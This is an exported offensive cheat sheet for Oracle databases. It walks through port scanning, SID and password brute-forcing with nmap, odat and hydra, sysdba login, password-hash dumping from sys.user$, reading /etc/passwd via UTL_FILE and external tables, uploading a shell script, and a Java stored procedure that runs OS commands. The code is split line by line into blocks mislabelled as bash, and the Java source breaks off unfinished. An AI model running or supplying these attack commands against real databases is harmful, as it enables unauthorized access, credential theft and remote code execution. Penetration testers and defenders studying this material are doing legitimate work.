---
id: "d17eku6armptlaq7n"
title: "oracle"
description: ""
tags: []
order: 15
createdAt: "2026-05-31T09:41:00.083Z"
updatedAt: "2026-05-31T09:41:51.860Z"
---

## Reconnaissance
<!-- section: {"id":"fx1ycucajmptlbt7r","order":0,"collapsed":false} -->

### s8efmtkohmptlbtap
```bash
nmap -sV -sC -p 1521,1522,1523,1524,2483,2484 $TARGET
```

_Reconnaissance Scan for Oracle default ports._

**Tags:** oracle, recon, nmap, rustscan
<!-- cmd: {"id":"s8efmtkohmptlbtap","language":"bash","sectionId":"fx1ycucajmptlbt7r","tags":["oracle","recon","nmap","rustscan"]} -->

### watl6z794mptlbtaw
```bash
rustscan -a $TARGET -p 1521 -- -sV --script oracle-sid-brute
```

**Tags:** oracle, recon, nmap, rustscan
<!-- cmd: {"id":"watl6z794mptlbtaw","language":"bash","sectionId":"fx1ycucajmptlbt7r","tags":["oracle","recon","nmap","rustscan"]} -->

### rczv0slenmptlbtb3
```bash
nmap -p 1521 --script=oracle-sid-brute,oracle-brute,oracle-brute-stealth,oracle-enum-users $TARGET
```

**Tags:** oracle, recon, nmap, rustscan
<!-- cmd: {"id":"rczv0slenmptlbtb3","language":"bash","sectionId":"fx1ycucajmptlbt7r","tags":["oracle","recon","nmap","rustscan"]} -->

## SID / Service Enumeration
<!-- section: {"id":"6qnryyjaumptlbt7z","order":1,"collapsed":false} -->

### 61aewr7rqmptlbtbj
```bash
nmap -p 1521 --script oracle-sid-brute $TARGET
```

_SID / Service Enumeration Oracle requires a SID or Service Name to connect._

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"61aewr7rqmptlbtbj","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### j84qh0yurmptlbtbp
```bash
nmap -p 1521 --script oracle-sid-brute --script-args oracle-sid-brute.sidfile=/usr/share/nmap/nselib/data/oracle-sids $TARGET
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"j84qh0yurmptlbtbp","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### tzk8fh8azmptlbtbu
```bash
oscanner -s $TARGET -P 1521
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"tzk8fh8azmptlbtbu","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### 71s0kstmpmptlbtc0
```bash
python3 odat.py sidguesser -s $TARGET -p 1521
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"71s0kstmpmptlbtc0","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### qau8z14y1mptlbtc7
```bash
python3 odat.py sidguesser -s $TARGET -p 1521 --sids-file /usr/share/odat/accounts/sids.txt
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"qau8z14y1mptlbtc7","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### xjnn1fiwfmptlbtcd
```bash
tnscmd10g version -h $TARGET
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"xjnn1fiwfmptlbtcd","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### yd1595vfdmptlbtch
```bash
tnscmd10g status -h $TARGET
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"yd1595vfdmptlbtch","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### wb46h4bfamptlbtcn
```bash
python3 odat.py tnscmd -s $TARGET -p 1521 --ping
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"wb46h4bfamptlbtcn","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### 76bicr499mptlbtcs
```bash
python3 odat.py tnscmd -s $TARGET -p 1521 --version
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"76bicr499mptlbtcs","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

### 8zo2lcw2hmptlbtcz
```bash
python3 odat.py tnscmd -s $TARGET -p 1521 --status
```

**Tags:** oracle, enumeration, sid, tnscmd, odat
<!-- cmd: {"id":"8zo2lcw2hmptlbtcz","language":"bash","sectionId":"6qnryyjaumptlbt7z","tags":["oracle","enumeration","sid","tnscmd","odat"]} -->

## Brute Force
<!-- section: {"id":"7sn0nm9shmptlbt84","order":2,"collapsed":false} -->

### 8cwq6ao6omptlbtdg
```bash
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=$SID $TARGET
```

_Brute Force_

**Tags:** oracle, bruteforce, hydra, odat
<!-- cmd: {"id":"8cwq6ao6omptlbtdg","language":"bash","sectionId":"7sn0nm9shmptlbt84","tags":["oracle","bruteforce","hydra","odat"]} -->

### dh7b61svimptlbtdk
```bash
nmap -p 1521 --script oracle-brute-stealth --script-args oracle-brute.sid=$SID $TARGET
```

**Tags:** oracle, bruteforce, hydra, odat
<!-- cmd: {"id":"dh7b61svimptlbtdk","language":"bash","sectionId":"7sn0nm9shmptlbt84","tags":["oracle","bruteforce","hydra","odat"]} -->

### 00chcq2vpmptlbtds
```bash
python3 odat.py passwordguesser -s $TARGET -p 1521 -d $SID
```

**Tags:** oracle, bruteforce, hydra, odat
<!-- cmd: {"id":"00chcq2vpmptlbtds","language":"bash","sectionId":"7sn0nm9shmptlbt84","tags":["oracle","bruteforce","hydra","odat"]} -->

### yfesonkx7mptlbte0
```bash
python3 odat.py passwordguesser -s $TARGET -p 1521 -d $SID --accounts-file /usr/share/odat/accounts/accounts_multiple.txt
```

**Tags:** oracle, bruteforce, hydra, odat
<!-- cmd: {"id":"yfesonkx7mptlbte0","language":"bash","sectionId":"7sn0nm9shmptlbt84","tags":["oracle","bruteforce","hydra","odat"]} -->

### olctcx7nrmptlbte6
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET oracle-listener:$SID
```

**Tags:** oracle, bruteforce, hydra, odat
<!-- cmd: {"id":"olctcx7nrmptlbte6","language":"bash","sectionId":"7sn0nm9shmptlbt84","tags":["oracle","bruteforce","hydra","odat"]} -->

## Authentication
<!-- section: {"id":"785yahroumptlbt8a","order":3,"collapsed":false} -->

### txt3gyakamptlbteh
```bash
sqlplus $USER/$PASS@$TARGET/$SID
```

_Authentication Connect to Oracle._

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"txt3gyakamptlbteh","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

### 8advblohbmptlbten
```bash
sqlplus $USER/$PASS@$TARGET:1521/$SID
```

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"8advblohbmptlbten","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

### fcibe7pjmmptlbtet
```bash
sqlplus $USER/$PASS@//$TARGET:1521/$SID
```

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"fcibe7pjmmptlbtet","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

### 4qoarm78ymptlbtez
```bash
sqlplus sys/$PASS@$TARGET/$SID as sysdba
```

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"4qoarm78ymptlbtez","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

### t7iljrgncmptlbtf5
```bash
python3 odat.py all -s $TARGET -p 1521 -d $SID -U $USER -P $PASS
```

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"t7iljrgncmptlbtf5","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

### 4d8t5yxswmptlbtfa
```bash
sqlplus '$USER/$PASS@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=$TARGET)(Port=1521))(CONNECT_DATA=(SID=$SID)))'
```

**Tags:** oracle, authentication, sqlplus
<!-- cmd: {"id":"4d8t5yxswmptlbtfa","language":"bash","sectionId":"785yahroumptlbt8a","tags":["oracle","authentication","sqlplus"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"alo82c7h9mptlbt8g","order":4,"collapsed":false} -->

### zbuwtvhhtmptlbtfu
```bash
-- Version
```

_Enumeration (Authenticated)_

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"zbuwtvhhtmptlbtfu","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### bdj5qr2msmptlbtg0
```bash
SELECT * FROM v$version;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"bdj5qr2msmptlbtg0","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### m5iepzt85mptlbtg5
```bash
SELECT banner FROM v$version;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"m5iepzt85mptlbtg5","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 0jh74ku25mptlbtgb
```bash
-- Current user
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"0jh74ku25mptlbtgb","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### jy3s6yzi1mptlbtgh
```bash
SELECT user FROM dual;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"jy3s6yzi1mptlbtgh","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 6srzhlgykmptlbtgo
```bash
-- All users
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"6srzhlgykmptlbtgo","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### jhmgc8wtgmptlbtgu
```bash
SELECT username, account_status, created FROM dba_users;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"jhmgc8wtgmptlbtgu","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### t964o6ey1mptlbtgz
```bash
-- DBA users (admins)
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"t964o6ey1mptlbtgz","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### zeen1qj8tmptlbth4
```bash
SELECT username FROM dba_role_privs WHERE granted_role='DBA';
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"zeen1qj8tmptlbth4","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 1597iroj2mptlbth9
```bash
-- Current privileges
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"1597iroj2mptlbth9","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### vjsq0x60gmptlbthg
```bash
SELECT * FROM session_privs;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"vjsq0x60gmptlbthg","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 0b3nfbunnmptlbthm
```bash
SELECT * FROM user_sys_privs;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"0b3nfbunnmptlbthm","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 4id2z7dhwmptlbthr
```bash
-- All tables
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"4id2z7dhwmptlbthr","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 4pfhdlqpemptlbthy
```bash
SELECT owner, table_name FROM dba_tables;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"4pfhdlqpemptlbthy","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 9h22swwwlmptlbti4
```bash
SELECT table_name FROM user_tables;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"9h22swwwlmptlbti4","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### jpbqss0y3mptlbtia
```bash
-- Password hashes
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"jpbqss0y3mptlbtia","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### vmxh4czcbmptlbtig
```bash
SELECT username, password FROM dba_users;    -- pre 11g
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"vmxh4czcbmptlbtig","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### jxt2a2issmptlbtin
```bash
SELECT username, spare4 FROM sys.user$;      -- 11g+ SHA1
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"jxt2a2issmptlbtin","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 97bclsiymmptlbtis
```bash
SELECT name, password, spare4 FROM sys.user$; -- all versions
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"97bclsiymmptlbtis","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### i1d6wa2aymptlbtiw
```bash
-- DB links
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"i1d6wa2aymptlbtiw","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### oujrfdm6xmptlbtj2
```bash
SELECT * FROM dba_db_links;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"oujrfdm6xmptlbtj2","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### okpm42v6smptlbtj9
```bash
SELECT * FROM all_db_links;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"okpm42v6smptlbtj9","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### 5u0zfla8pmptlbtjf
```bash
-- Directories
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"5u0zfla8pmptlbtjf","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### xxt7rkwuomptlbtjk
```bash
SELECT directory_name, directory_path FROM dba_directories;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"xxt7rkwuomptlbtjk","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### oke4zcxd5mptlbtjq
```bash
-- Scheduler jobs
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"oke4zcxd5mptlbtjq","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

### ozn541faimptlbtjw
```bash
SELECT owner, job_name, job_type, job_action FROM dba_scheduler_jobs;
```

**Tags:** oracle, enumeration, authenticated, dba
<!-- cmd: {"id":"ozn541faimptlbtjw","language":"bash","sectionId":"alo82c7h9mptlbt8g","tags":["oracle","enumeration","authenticated","dba"]} -->

## File Read (UTL_FILE)
<!-- section: {"id":"234fa4pqcmptlbt8k","order":5,"collapsed":false} -->

### 6651j2gp6mptlbtkl
```bash
-- Read file via UTL_FILE (requires EXECUTE privilege)
```

_File Read (UTL_FILE)_

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"6651j2gp6mptlbtkl","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### y3xx8vbxbmptlbtks
```bash
DECLARE
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"y3xx8vbxbmptlbtks","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### e1jjftfl6mptlbtky
```bash
  v_file UTL_FILE.FILE_TYPE;
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"e1jjftfl6mptlbtky","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### ku8f6ptromptlbtl3
```bash
  v_line VARCHAR2(4000);
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"ku8f6ptromptlbtl3","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### kfimjnlm2mptlbtlb
```bash
BEGIN
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"kfimjnlm2mptlbtlb","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### qkz0nh62mmptlbtlg
```bash
  v_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'filename.txt', 'R');
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"qkz0nh62mmptlbtlg","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### 52m29r5gtmptlbtlm
```bash
  LOOP
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"52m29r5gtmptlbtlm","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### d8wlczxvkmptlbtlr
```bash
    UTL_FILE.GET_LINE(v_file, v_line);
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"d8wlczxvkmptlbtlr","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### xoztcbohcmptlbtly
```bash
    DBMS_OUTPUT.PUT_LINE(v_line);
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"xoztcbohcmptlbtly","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### ulteu46u6mptlbtm6
```bash
  END LOOP;
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"ulteu46u6mptlbtm6","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### kceokzjlhmptlbtmb
```bash
  EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.FCLOSE(v_file);
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"kceokzjlhmptlbtmb","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### ghfh8o33pmptlbtmg
```bash
END;
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"ghfh8o33pmptlbtmg","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### yxbjsprngmptlbtmm
```bash
/
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"yxbjsprngmptlbtmm","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### l2n1o5u29mptlbtmr
```bash
-- Using odat
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"l2n1o5u29mptlbtmr","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### 2025xz913mptlbtmz
```bash
python3 odat.py utlfile -s $TARGET -d $SID -U $USER -P $PASS --getFile /etc/passwd /tmp/ passwd
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"2025xz913mptlbtmz","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### qka4ilbdmmptlbtn4
```bash
-- Via external table
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"qka4ilbdmmptlbtn4","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### lyisei1ipmptlbtn9
```bash
CREATE OR REPLACE DIRECTORY tmp_dir AS '/etc';
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"lyisei1ipmptlbtn9","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### es1alk7jimptlbtne
```bash
CREATE TABLE etc_passwd (line VARCHAR2(4000)) ORGANIZATION EXTERNAL (
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"es1alk7jimptlbtne","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### 69awvzas3mptlbtnj
```bash
  TYPE oracle_loader DEFAULT DIRECTORY tmp_dir
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"69awvzas3mptlbtnj","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### aere1pns8mptlbtnq
```bash
  ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE FIELDS (line CHAR(4000)))
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"aere1pns8mptlbtnq","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### wq6kcw3k5mptlbtnw
```bash
  LOCATION ('passwd')
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"wq6kcw3k5mptlbtnw","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### ux9ar1qolmptlbto1
```bash
) REJECT LIMIT UNLIMITED;
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"ux9ar1qolmptlbto1","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

### tg286axlimptlbto6
```bash
SELECT * FROM etc_passwd;
```

**Tags:** oracle, fileread, utlfile, exploitation
<!-- cmd: {"id":"tg286axlimptlbto6","language":"bash","sectionId":"234fa4pqcmptlbt8k","tags":["oracle","fileread","utlfile","exploitation"]} -->

## File Write
<!-- section: {"id":"0nzv3dhc5mptlbt8p","order":6,"collapsed":false} -->

### avh0tbmywmptlbtpi
```bash
-- Write file via UTL_FILE
```

_File Write_

**Tags:** oracle, filewrite, exploitation
<!-- cmd: {"id":"avh0tbmywmptlbtpi","language":"bash","sectionId":"0nzv3dhc5mptlbt8p","tags":["oracle","filewrite","exploitation"]} -->

### pshnc5bh7mptlbtpn
```bash
python3 odat.py utlfile -s $TARGET -d $SID -U $USER -P $PASS --putFile /tmp/ shell.sh /tmp/shell.sh
```

**Tags:** oracle, filewrite, exploitation
<!-- cmd: {"id":"pshnc5bh7mptlbtpn","language":"bash","sectionId":"0nzv3dhc5mptlbt8p","tags":["oracle","filewrite","exploitation"]} -->

### h676rmtszmptlbtps
```bash
-- Java stored procedure (if Java enabled)
```

**Tags:** oracle, filewrite, exploitation
<!-- cmd: {"id":"h676rmtszmptlbtps","language":"bash","sectionId":"0nzv3dhc5mptlbt8p","tags":["oracle","filewrite","exploitation"]} -->

### 25j16dobomptlbtpz
```bash
python3 odat.py java -s $TARGET -d $SID -U $USER -P $PASS --shell
```

**Tags:** oracle, filewrite, exploitation
<!-- cmd: {"id":"25j16dobomptlbtpz","language":"bash","sectionId":"0nzv3dhc5mptlbt8p","tags":["oracle","filewrite","exploitation"]} -->

## RCE via Java Stored Procedures
<!-- section: {"id":"kebbsdonymptlbt8u","order":7,"collapsed":false} -->

### p1ifmm1tdmptlbtqb
```bash
python3 odat.py java -s $TARGET -d $SID -U $USER -P $PASS --test-module
```

_RCE via Java Stored Procedures_

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"p1ifmm1tdmptlbtqb","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### vylczu8avmptlbtqg
```bash
python3 odat.py java -s $TARGET -d $SID -U $USER -P $PASS --exec id
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"vylczu8avmptlbtqg","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### vbtkwp71tmptlbtql
```bash
python3 odat.py java -s $TARGET -d $SID -U $USER -P $PASS --shell
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"vbtkwp71tmptlbtql","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### 11vh0wwfkmptlbtqr
```bash
begin
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"11vh0wwfkmptlbtqr","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### ub3sjd9yfmptlbtqx
```bash
  dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete');
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"ub3sjd9yfmptlbtqx","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### htrb1qqh2mptlbtr2
```bash
  dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','');
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"htrb1qqh2mptlbtr2","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### gn0i02464mptlbtr8
```bash
  dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','');
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"gn0i02464mptlbtr8","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### 3msggz27smptlbtrd
```bash
end;
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"3msggz27smptlbtrd","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### ny1perbdymptlbtri
```bash
/
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"ny1perbdymptlbtri","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### w6d3hzdrwmptlbtro
```bash
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "RCE" AS
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"w6d3hzdrwmptlbtro","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### bo14qxp9vmptlbtrv
```bash
import java.lang.*; import java.io.*;
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"bo14qxp9vmptlbtrv","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### uxzlvwgrxmptlbts0
```bash
public class RCE {
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"uxzlvwgrxmptlbts0","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### fsdt6vifhmptlbts5
```bash
  public static String exec(String cmd) throws Exception {
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"fsdt6vifhmptlbts5","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### s047tam7xmptlbtsb
```bash
    Process p = Runtime.getRuntime().exec(cmd);
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"s047tam7xmptlbtsb","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### zvp1qdb8dmptlbtsg
```bash
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"zvp1qdb8dmptlbtsg","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### 7cqcqpywdmptlbtsm
```bash
    String l, out = "";
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"7cqcqpywdmptlbtsm","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### cbgo58ucbmptlbtss
```bash
    while((l=r.readLine())!=null) out += l + "\n";
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"cbgo58ucbmptlbtss","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### rn5w0xyc7mptlbtsx
```bash
    return out;
```

**Tags:** oracle, rce, java, exploitation
<!-- cmd: {"id":"rn5w0xyc7mptlbtsx","language":"bash","sectionId":"kebbsdonymptlbt8u","tags":["oracle","rce","java","exploitation"]} -->

### wh7kjssqxmptlbtt4
```bash
  }
```

**Tags:** oracle, rce, java, exploitation
